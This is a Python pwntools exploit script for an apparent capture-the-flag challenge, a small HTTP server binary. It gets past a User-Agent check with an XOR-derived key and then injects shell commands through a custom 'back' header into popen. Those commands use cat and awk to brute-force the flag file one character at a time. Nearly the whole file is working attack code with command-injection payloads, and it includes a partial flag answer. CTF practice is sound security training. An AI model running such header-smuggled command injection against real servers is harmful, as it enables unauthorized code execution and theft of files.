'''
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

1. debug to get User-Agent content through forked server | nc to foked server and gdb attach main server?
2. popen to RCE and bypass the checking logic
3. remote server need to awk brute the flag to print out 
'''

from pwn import *


local = 0
url, port = "node5.buuoj.cn", "28859" 
filename = "./http"
elf = ELF(filename)
context(arch="amd64", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

key = "2016CCRT"
flag = ""
for i in range(len(key)):
    flag += chr(ord(key[i]) ^ i)

# brute the flag, remote server is unstable then brute it byte by byte in many times
def pwn():
    bflag = "flag{0d716942-45cd-476a-957d-2c78f5b46f8"
    for p in range(len(bflag), 41):
        for brutech in '0123456789abcdef-':
            command = "cat flag|awk '{if(substr($1,%d,1)==\"%s\") print \"%s\"}'" % (p+1, brutech, "A")
            try:
                io = remote("node5.buuoj.cn",28859)
            except:
                print('---------------------' + bflag + '---------------------')
            
            payload = b""
            payload += b"GET / HTTP/1.1\r\n"
            payload += b"User-Agent: " + flag.encode() + b"\r\n"
            payload += b"back: %s\r\n" % command.encode()
            payload += b"\r\n\r\n"
            print(payload)
            io.send(payload)
            recvcontent = io.read()
            io.close()
            if b"500" in recvcontent:
                continue
            
            bflag += brutech
            print('---------------------' + bflag + '---------------------')
    
    return bflag + '}'

if __name__ == "__main__":
    flag = pwn()
    print('flag:', flag)
